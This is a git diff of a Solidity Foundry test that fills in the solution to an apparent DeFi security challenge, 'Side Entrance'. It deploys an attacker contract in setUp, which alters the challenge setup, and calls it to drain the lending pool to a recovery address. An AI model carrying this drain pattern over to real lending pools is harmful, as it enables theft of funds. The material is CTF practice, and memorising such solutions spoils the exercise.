@@ -3,7 +3,7 @@
 pragma solidity =0.8.25;
 
 import {Test, console} from "forge-std/Test.sol";
-import {SideEntranceLenderPool} from "../../src/side-entrance/SideEntranceLenderPool.sol";
+import {SideEntranceLenderPool, SideEntranceLenderPoolAttacker} from "../../src/side-entrance/SideEntranceLenderPool.sol";
 
 contract SideEntranceChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -14,6 +14,7 @@ contract SideEntranceChallenge is Test {
     uint256 constant PLAYER_INITIAL_ETH_BALANCE = 1e18;
 
     SideEntranceLenderPool pool;
+    SideEntranceLenderPoolAttacker attacker;
 
     modifier checkSolvedByPlayer() {
         vm.startPrank(player, player);
@@ -28,6 +29,7 @@ contract SideEntranceChallenge is Test {
     function setUp() public {
         startHoax(deployer);
         pool = new SideEntranceLenderPool();
+        attacker = new SideEntranceLenderPoolAttacker(address(pool));
         pool.deposit{value: ETHER_IN_POOL}();
         vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
         vm.stopPrank();
@@ -45,7 +47,9 @@ contract SideEntranceChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_sideEntrance() public checkSolvedByPlayer {
-        
+        payable(attacker).transfer(1 ether);
+        attacker.attack();
+        payable(recovery).transfer(1000 ether);
     }
 
     /**
@@ -53,6 +57,10 @@ contract SideEntranceChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(address(pool).balance, 0, "Pool still has ETH");
-        assertEq(recovery.balance, ETHER_IN_POOL, "Not enough ETH in recovery account");
+        assertEq(
+            recovery.balance,
+            ETHER_IN_POOL,
+            "Not enough ETH in recovery account"
+        );
     }
 }
